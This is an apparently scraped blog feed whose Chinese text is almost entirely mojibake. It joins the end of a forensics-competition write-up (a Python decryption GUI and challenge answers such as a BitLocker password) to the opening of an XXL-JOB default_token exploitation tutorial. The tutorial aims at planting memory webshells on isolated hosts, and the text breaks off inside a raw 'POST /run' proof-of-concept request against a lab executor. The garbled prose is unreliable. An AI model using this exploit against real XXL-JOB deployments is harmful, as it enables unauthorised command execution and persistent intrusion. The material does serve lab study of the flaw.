class="built_in">hex</span>())</span><br><span class="line">            decrypted = self.unpad_data(decrypted_padded)</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] decrypted sample:&quot;</span>, decrypted[:<span class="number">256</span>].<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(decrypted)</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] written output:&quot;</span>, output_file)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>, output_file</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] Exception:&quot;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecryptionGUI</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        self.root = root</span><br><span class="line">        self.root.title(<span class="string">&#x27;File Decryption Tool Debug&#x27;</span>)</span><br><span class="line">        self.root.geometry(<span class="string">&#x27;500x300&#x27;</span>)</span><br><span class="line">        self.root.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        self.decryptor = DecryptionToolDebug()</span><br><span class="line">        self.setup_ui()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setup_ui</span>(<span class="params">self</span>):</span></span><br><span class="line">        file_frame = tk.Frame(self.root, pady=<span class="number">20</span>)</span><br><span class="line">        file_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        tk.Label(file_frame, text=<span class="string">&#x27;Select File to Decrypt:&#x27;</span>).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line">        self.file_path = tk.StringVar()</span><br><span class="line">        tk.Entry(file_frame, textvariable=self.file_path, width=<span class="number">30</span>).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line">        tk.Button(file_frame, text=<span class="string">&#x27;Browse&#x27;</span>, command=self.browse_file).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        action_frame = tk.Frame(self.root, pady=<span class="number">20</span>)</span><br><span class="line">        action_frame.pack()</span><br><span class="line">        tk.Button(action_frame, text=<span class="string">&#x27;Decrypt File&#x27;</span>, command=self.decrypt_file, bg=<span class="string">&#x27;#2196F3&#x27;</span>, fg=<span class="string">&#x27;white&#x27;</span>, width=<span class="number">15</span>, height=<span class="number">2</span>).pack(pady=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        status_frame = tk.Frame(self.root, pady=<span class="number">10</span>)</span><br><span class="line">        status_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        self.status_var = tk.StringVar()</span><br><span class="line">        self.status_var.<span class="built_in">set</span>(<span class="string">&#x27;Ready&#x27;</span>)</span><br><span class="line">        tk.Label(status_frame, textvariable=self.status_var, bd=<span class="number">1</span>, relief=tk.SUNKEN, anchor=tk.W).pack(fill=<span class="string">&#x27;x&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">browse_file</span>(<span class="params">self</span>):</span></span><br><span class="line">        filename = filedialog.askopenfilename(title=<span class="string">&#x27;Select File to Decrypt&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            self.file_path.<span class="built_in">set</span>(filename)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_file</span>(<span class="params">self</span>):</span></span><br><span class="line">        file_path = self.file_path.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_path:</span><br><span class="line">            messagebox.showerror(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;Please select a file first!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.status_var.<span class="built_in">set</span>(<span class="string">&#x27;Decrypting...&#x27;</span>)</span><br><span class="line">        self.root.update()</span><br><span class="line">        success, result = self.decryptor.decrypt_file(file_path)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            self.status_var.<span class="built_in">set</span>(<span class="string">f&#x27;Decryption complete! Output: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">            messagebox.showinfo(<span class="string">&#x27;Success&#x27;</span>, <span class="string">f&#x27;File decrypted successfully!\nOutput: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.status_var.<span class="built_in">set</span>(<span class="string">f&#x27;Decryption failed: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&#x27;Error&#x27;</span>, <span class="string">f&#x27;Decryption failed: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    app = DecryptionGUI(root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»£ç å°±æ˜¯ä¸Šæ–¹çš„ï¼Œè¿™é‡Œç¬”è€…åŠ äº†è°ƒè¯•<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106143454475.png" alt="image-20251106143454475"></p><p>ä¹Ÿæ²¡æ‰¾åˆ°ä»»ä½•ç›¸å…³å¯†ç ï¼Œæ‰€ä»¥  ä¸å¤ªæ¸…æ¥šæ€ä¹ˆæ‰¾åˆ°çš„è¿™ä¸ªæ•°å­—äº†ï¼Œä½†æ˜¯ç¬”è€…æ„Ÿè§‰99.87%ä¸æ˜¯çˆ†ç ´å‡ºæ¥çš„ã€‚å…ˆæ”¾åˆ°è¿™é‡Œå§ã€‚åœ¨è¯´ä¸€ç‚¹ï¼Œè¿™ä¸ªä»£ç åœ¨ç¬¬ä¸‰å±Šç›˜å¤çŸ³æ¯ åˆèµ›å‡ºç°è¿‡ï¼ˆ<a href="%E8%8B%B9%E6%9E%9C%E5%BA%94%E7%94%A8%E5%8F%96%E8%AF%81-macos-apps-forensics">è‹¹æœåº”ç”¨å–è¯ macOS Apps Forensics</a>ï¼‰ã€‚æŠ„å¤§å¸ˆå‚…çš„ä¸€ä¸ª688561<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106144032616.png" alt="image-20251106144032616"></p><h5 id="54ã€"><a href="#54ã€" class="headerlink" title="54ã€"></a>54ã€</h5><p>è¯·åˆ†ææŸå¸‚10æœˆ6æ—¥æœ€é«˜æ°”æ¸©æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>å…¬å¸èµ„æ–™é‡Œæœ‰<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106144137043.png" alt="image-20251106144137043"></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106144306634.png" alt="image-20251106144306634"></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106144730607-17624116508471.png" alt="image-20251106144730607"></p><p>09æ‰£æˆ00ä¿å­˜å³å¯ã€‚</p><h5 id="55ã€"><a href="#55ã€" class="headerlink" title="55ã€"></a>55ã€</h5><p>ç”¨æˆ·çš„BitLockerå¯†ç æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæŒ‰ç…§å®é™…æƒ…å†µå¡«å†™ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>é‚®ç®±é‡Œæœ‰ä¸€ä¸ªé‚®ä»¶å›¾ç‰‡æ²¡æœ‰ç”¨åˆ°ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106152533281.png" alt="image-20251106152533281"></p><p>zsteg -a ,5202MTJSJBZS å³å¯  åè¿‡æ¥ï¼Œæ­£è§£åº”è¯¥æ˜¯ç”¨ä¸‹è½½é‡Œçš„é‚£ä¸ªæ–‡ä»¶è§£å¯†ã€‚</p><h5 id="56ã€"><a href="#56ã€" class="headerlink" title="56ã€"></a>56ã€</h5><p>ç”¨æˆ·åŠå…¬å®¤çš„é—¨ç¦å¯†ç æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæŒ‰ç…§å®é™…æƒ…å†µå¡«å†™ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106153056507.png" alt="image-20251106153056507"></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106153352106.png" alt="image-20251106153352106"></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106154102384.png" alt="image-20251106154102384"></p><h5 id="57ã€"><a href="#57ã€" class="headerlink" title="57ã€"></a>57ã€</h5><p>ç”¨æˆ·ä½¿ç”¨çš„ä»¥Då¼€å¤´çš„è§£å¯†ç¨‹åºçš„MD5å€¼åå…­ä½æ˜¯ï¼Ÿï¼ˆå­—æ¯å…¨å¤§å†™ï¼Œç­”æ¡ˆæ ¼å¼ï¼šAAAAAAï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106145456702.png" alt="image-20251106145456702"></p><p>è¿˜æ˜¯é‚£ä¸ªexe</p><h4 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h4><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™ï¼Œç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/t0xMaHwgXW_8zAEd_PihrQ</span><br><span class="line">https://blog.csdn.net/xcellencw/article/details/154254103</span><br><span class="line">https://www.cnblogs.com/WXjzc/p/19190900</span><br><span class="line">https://blog.csdn.net/m0_37867238/article/details/154353116</span><br><span class="line">https://www.cnblogs.com/zzpu213/p/19185599</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote><p>æœ¬æ–‡ç« åªåŒ…å«è®¡ç®—æœºå–è¯éƒ¨åˆ†ï¼Œå¾ˆå¿«å°†æ›´æ–°å…¶ä»–éƒ¨åˆ†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xxl-job</title>
      <link href="/2025/09/26/xxl-job/"/>
      <url>/2025/09/26/xxl-job/</url>
      
        <content type="html"><![CDATA[<h4 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h4><p>ksæœ€è¿‘å¤§å¸ˆå‚…è¯´æœ‰è¿™ä¸ªç«™è®©çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½åˆ©ç”¨ä¸€ä¸‹ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« ï¼Œxxl-jobï¼Œdefault_token åˆ©ç”¨ã€‚æœ¬ç¯‡æ–‡ç« æ—¨åœ¨è¯¦ç»†ä»‹ç»XXL-JOBå¹³å°ä¸­å·²è¢«å‘ç°çš„default_token åˆ©ç”¨ï¼Œä»¥åŠè¿™äº›æ¼æ´å¯èƒ½è¢«åˆ©ç”¨çš„æ–¹å¼ï¼Œå¦‚å„ç‰ˆæœ¬åœ¨ä¸å‡ºç½‘çš„æƒ…å†µä¸‹æ€ä¹ˆæ‰“å†…å­˜é©¬ï¼Œæ€ä¹ˆæ‰“éš§é“ã€‚</p><p><code>java -jar xxl-job-executor-sample-springboot-2.3.0.jar --spring.config.location=./application.properties</code></p><p><a href="https://xz.aliyun.com/news/12886">https://xz.aliyun.com/news/12886</a></p><p><a href="https://cloud.tencent.com/developer/article/2378322">https://cloud.tencent.com/developer/article/2378322</a></p><h4 id="äºŒã€XXL-JOBç®€ä»‹"><a href="#äºŒã€XXL-JOBç®€ä»‹" class="headerlink" title="äºŒã€XXL-JOBç®€ä»‹"></a>äºŒã€XXL-JOBç®€ä»‹</h4><p><strong>2.1 æ¦‚è¿°</strong></p><p>XXL-JOBæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦å¹³å°ï¼Œè®¾è®¡å®—æ—¨æ˜¯å®ç°ä»»åŠ¡çš„å¿«é€Ÿå¼€å‘ã€ç®€æ˜“å­¦ä¹ å’Œè½»é‡çº§éƒ¨ç½²ï¼ŒåŒæ—¶å…·å¤‡è‰¯å¥½çš„æ‰©å±•æ€§ã€‚è¯¥å¹³å°ç”±è°ƒåº¦ä¸­å¿ƒå’Œç®¡ç†æ‰§è¡Œå™¨çš„ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå®ƒä»¬é€šè¿‡ç½‘ç»œè¿›è¡Œé€šä¿¡ï¼Œå®ç°ä»»åŠ¡çš„è°ƒåº¦å’Œæ‰§è¡Œã€‚è°ƒåº¦ä¸­å¿ƒè´Ÿè´£ä»»åŠ¡çš„å‘èµ·å’Œè°ƒåº¦ç­–ç•¥çš„é…ç½®ï¼Œè€Œæ‰§è¡Œå™¨åˆ™è´Ÿè´£æ¥æ”¶ä»»åŠ¡è¯·æ±‚å¹¶æ‰§è¡Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘ã€‚</p><p>é€šä¿—çš„æ¥è¯´ï¼ŒXXL-JOBå°±åƒä¸€ä¸ªè¶…çº§å¼ºå¤§çš„é—¹é’Ÿï¼Œä½†å®ƒä¸ä»…ä»…èƒ½è®¾å®šå›ºå®šçš„æ—¶é—´å“é“ƒï¼Œè¿˜èƒ½æ ¹æ®å¤æ‚çš„è§„åˆ™å’Œæ¡ä»¶æ¥è§¦å‘ä»»åŠ¡ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æœ‰ä¸€ä¸ªä»»åŠ¡éœ€è¦æ¯å¤©æ—©ä¸Š8ç‚¹æ‰§è¡Œï¼Œå¦å¤–ä¸€ä¸ªä»»åŠ¡éœ€è¦åœ¨æ¯æœˆçš„ç¬¬1å¤©æ™šä¸Š12ç‚¹æ‰§è¡Œï¼Œè¿˜æœ‰ä»»åŠ¡æ˜¯åŸºäºæŸäº›ç‰¹å®šäº‹ä»¶è§¦å‘çš„ï¼Œæ¯”å¦‚æ•°æ®åº“ä¸­çš„æ•°æ®è¾¾åˆ°ä¸€å®šé‡æ—¶ã€‚</p><p><strong>2.2 ç‰¹ç‚¹</strong></p><p>XXL-JOBå°±åƒä¸€ä¸ªæ™ºèƒ½åŠ©æ‰‹ï¼Œå®ƒå¯ä»¥å¸®ä½ è®¾å®šè¿™äº›ä»»åŠ¡ï¼Œå¹¶ä¸”ç¡®ä¿å®ƒä»¬åœ¨æ­£ç¡®çš„æ—¶é—´å¾—åˆ°æ‰§è¡Œã€‚å®ƒæœ‰ä»¥ä¸‹å‡ ä¸ªå…³é”®ç‰¹ç‚¹ï¼š</p><p>å®¹å™¨åŒ–ï¼šæä¾›å®˜æ–¹dockeré•œåƒï¼Œå¹¶å®æ—¶æ›´æ–°æ¨é€dockerhubï¼Œè¿›ä¸€æ­¥å®ç°äº§å“å¼€ç®±å³ç”¨ã€‚<br>è„šæœ¬ä»»åŠ¡ï¼šæ”¯æŒä»¥GLUEæ¨¡å¼å¼€å‘å’Œè¿è¡Œè„šæœ¬ä»»åŠ¡ï¼ŒåŒ…æ‹¬Shellã€Pythonã€NodeJSã€PHPã€PowerShellç­‰ç±»å‹è„šæœ¬ã€‚<br>åŠ¨æ€ï¼šæ”¯æŒåŠ¨æ€ä¿®æ”¹ä»»åŠ¡çŠ¶æ€ã€å¯åŠ¨/åœæ­¢ä»»åŠ¡ï¼Œä»¥åŠç»ˆæ­¢è¿è¡Œä¸­ä»»åŠ¡ï¼Œå³æ—¶ç”Ÿæ•ˆã€‚<br>Rollingå®æ—¶æ—¥å¿—ï¼šæ”¯æŒåœ¨çº¿æŸ¥çœ‹è°ƒåº¦ç»“æœï¼Œå¹¶ä¸”æ”¯æŒä»¥Rollingæ–¹å¼å®æ—¶æŸ¥çœ‹æ‰§è¡Œå™¨è¾“å‡ºçš„å®Œæ•´çš„æ‰§è¡Œæ—¥å¿—ã€‚</p><p>2.3 æ¶æ„</p><p>XXL-JOB é‡‡ç”¨çš„æ˜¯ <strong>ä¸­å¿ƒè°ƒåº¦ + åˆ†å¸ƒå¼æ‰§è¡Œå™¨</strong> çš„æ¶æ„ï¼š</p><pre><code>      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚        XXL-JOB Admin        â”‚      â”‚   ï¼ˆè°ƒåº¦ä¸­å¿ƒ/æ§åˆ¶å°ï¼‰          â”‚      â”‚                             â”‚      â”‚ - ä»»åŠ¡ç®¡ç†ï¼ˆWeb UIï¼‰          â”‚      â”‚ - æ‰§è¡Œæ—¥å¿—æŸ¥çœ‹                â”‚      â”‚ - æ‰§è¡Œå™¨æ³¨å†Œç®¡ç†              â”‚      â”‚ - ä»»åŠ¡è°ƒåº¦ä¸åˆ†å‘              â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚                       â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ XXL-JOB Executor â”‚     â”‚ XXL-JOB Executor â”‚â”‚ ï¼ˆæ‰§è¡Œå™¨å®ä¾‹ï¼‰    â”‚     â”‚ ï¼ˆæ‰§è¡Œå™¨å®ä¾‹ï¼‰    â”‚â”‚ - ä»»åŠ¡æ‰§è¡Œ       â”‚     â”‚ - ä»»åŠ¡æ‰§è¡Œ       â”‚â”‚ - æ—¥å¿—ä¸ŠæŠ¥       â”‚     â”‚ - æ—¥å¿—ä¸ŠæŠ¥       â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</code></pre><p>ç®€å•çš„æ¥è¯´ï¼Œå½“æˆ‘ä»¬è§åˆ°è¿™ä¸ªé¡µé¢æ—¶ï¼Œæˆ‘æ²¡è§åˆ°çš„è°ƒåº¦ä¸­å¿ƒï¼Œ</p><p><img src="D:\myBlog\images\xxl-job\image-20251009142921574.png" alt="image-20251009142921574"></p><p>ç™»å½•åï¼Œåå°çš„æ‰§è¡Œå™¨ï¼Œæ‰æ˜¯çœŸæ­£æ‰§è¡Œä»»åŠ¡çš„ã€‚<img src="D:\myBlog\images\xxl-job\image-20251009143054727.png" alt="image-20251009143054727"></p><p>äºŒã€ç¯å¢ƒæ­å»º</p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨ç°æˆ<a href="https://github.com/vulhub/vulhub%EF%BC%8C">https://github.com/vulhub/vulhubï¼Œ</a></p><p>cd /vulhub/xxl-job/unacc ç›´æ¥èµ·å³å¯ï¼Œ</p><p><img src="D:\myBlog\images\xxl-job\image-20251023160142235.png" alt="image-20251023160142235">vulhubé‡Œé¢é»˜è®¤èµ·çš„çš„xxl-job2.2ç‰ˆæœ¬çš„ï¼Œ2.2ç‰ˆæœ¬å’Œã€‚23ç‰ˆæœ¬æ‰“é©¬çš„æ—¶å€™æœ‰ä¸€äº›åŒºåˆ«ã€‚å¦‚æœæƒ³æµ‹è¯•2.3ç‰ˆæœ¬çš„è¯ï¼Œéœ€è¦é‡æ–°åˆ°xxlå®˜ç½‘å»ä¸‹è½½2.3  ç„¶åï¼Œmvnç¼–è¯‘ï¼Œ9999 8081éƒ½å·²å ç”¨ï¼ŒåŠ ä¸€ä¸‹nettyå’Œtomcatç›‘å¬çš„ç«¯å£<br><img src="D:\myBlog\images\xxl-job\image-20251023155102541.png" alt="image-20251023155102541"></p><p>æœ¬æ–‡å°†ç ”ç©¶çš„æ˜¯xxlæ‰“8081ç«¯å£ï¼Œè€Œä¸æ˜¯æ‰“æ‰§è¡Œå‘½ä»¤çš„ç«¯å£ã€‚<img src="D:\myBlog\images\xxl-job\image-20251023155241483.png" alt="image-20251023155241483"></p><p>æˆ‘ä»¬åœ¨å¯åŠ¨xxl-job-executorçš„æ—¶å€™ï¼Œä¼šå¯åŠ¨ä¸¤ä¸ªç«¯å£ï¼Œä¸€ä¸ªæ˜¯8081ç«¯å£ä¸€ä¸ªæ˜¯9999ç«¯å£<br><img src="D:\myBlog\images\xxl-job\image-20251023155358366.png" alt="image-20251023155358366"></p><p>9999ç«¯å£ï¼Œå¯åŠ¨çš„nettyçš„ä¸­é—´ä»¶ï¼Œ8081ç«¯å£å¯åŠ¨çš„æ˜¯tomcatï¼Œæˆ‘ä»¬åœ¨9999ç«¯å£æ‰“å®Œé©¬åï¼Œè¦è¿æ¥8081çš„å†…å­˜é©¬ã€‚å¯åŠ¨åï¼Œè®¿é—®</p><p><img src="D:\myBlog\images\xxl-job\image-20251023160225591.png" alt="image-20251023160225591"></p><p>è®¿é—®ï¼Œ<a href="http://192.168.133.134:9999/">http://192.168.133.134:9999/</a></p><p><img src="D:\myBlog\images\xxl-job\image-20251023160301188.png" alt="image-20251023160301188"></p><p>è¯´æ˜æ²¡é—®é¢˜ã€‚</p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>XXL-JOB &lt;= 2.4.0çš„æ—¶å€™ï¼Œé»˜è®¤ä¸‹è½½çš„æ‰§è¡Œå™¨çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œtokené»˜è®¤ä¸ºç©ºæˆ–è€…ä¸ºdefault_tokenï¼Œå¦‚æœå¼€å‘è€…æ²¡æ”¹çš„è¯ï¼Œä¹Ÿå°±å¯ä»¥è¿›è¡Œåˆ©ç”¨äº†ã€‚ç½‘ä¸Šç»™çš„ä¸€äº›ä»£ç æˆ–è€…å·¥å…·éƒ½æ˜¯åˆ©ç”¨åˆ°åå¼¹shellæˆ–è€…å‘½ä»¤æ‰§è¡Œå°±ç»“æŸäº†ï¼Œå¹¶ä¸”æ˜¯spring bootçš„é¡¹ç›®ï¼Œä¹Ÿä¼ ä¸äº†jspæ–‡ä»¶ï¼Œå¦‚æœåœ¨å®æˆ˜ä¸­ï¼Œé‡åˆ°äº†ä¸å‡ºç½‘çš„æœºå™¨ï¼Œé‚£ä¹ˆå°±ä¸å¥½åŠäº†ï¼Œæ‰€ä»¥è¦æ‰“å†…å­˜é©¬æ¯”è¾ƒæ–¹ä¾¿åç»­æ¸—é€ã€‚</p><p>æˆ‘ä»¬æ¥å…ˆç®€å•çœ‹ä¸‹æ‰§è¡Œå‘½ä»¤çš„pocï¼Œ</p><p>è¿™é‡Œæˆ‘ä»¬å‡è®¾è®¿é—®ä¸åˆ°8080çš„é¢æ¿ï¼Œåªèƒ½è®¿é—®åˆ°æ‰§è¡Œå™¨ç«¯å£ï¼Œ<a href="http://192.168.133.134:9999/%EF%BC%8C">http://192.168.133.134:9999/ï¼Œ</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/run</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.133.134:9999</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: 